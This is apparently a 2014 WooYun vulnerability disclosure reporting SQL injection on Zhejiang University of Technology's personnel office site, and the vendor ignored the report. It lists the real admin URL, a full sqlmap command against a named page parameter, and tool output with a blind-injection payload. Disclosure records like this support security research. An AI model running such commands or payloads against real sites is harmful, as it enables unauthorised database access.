wybug_title: 浙江某大学人事处sql注入
wybug_status: 漏洞已经通知厂商但是厂商忽略漏洞
wybug_detail:
漏洞详情 披露状态：   									2014-08-21：	细节已通知厂商并且等待厂商处理中									2014-08-26：	厂商已经主动忽略漏洞，细节向公众公开  简要描述： sql注入 详细说明：  浙江工业大学人事处网站存在sql注入   漏洞证明：  1、浙江工业大学人事处后台地址
www.rsc.zjut.edu.cn/admin.asp
2、自动注入测试
sqlmap.py -u "http://www.rsc.zjut.edu.cn/veiwnews.asp?newsid=2049" --tables    sqlmap/1.0-dev - automatic SQL injection and database takeover tool    http://sqlmap.org[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicablelocal, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program[*] starting at 14:36:27[14:36:27] [INFO] resuming back-end DBMS 'microsoft access'[14:36:27] [INFO] testing connection to the target URL[14:36:28] [INFO] heuristics detected web page charset 'ISO-8859-2'sqlmap identified the following injection points with a total of 0 HTTP(s) requests:---Place: GETParameter: newsid    Type: boolean-based blind    Title: AND boolean-based blind - WHERE or HAVING clause    Payload: newsid=2049 AND 4361=4361
3、未进一步做其它测试，懒得弄了   修复方案：  略   版权声明：转载请注明来源 汪小弟@乌云
wybug_reply: 漏洞回应  厂商回应： 危害等级：无影响厂商忽略 忽略时间：2014-08-26 16:40 厂商回复：  最新状态： 暂无
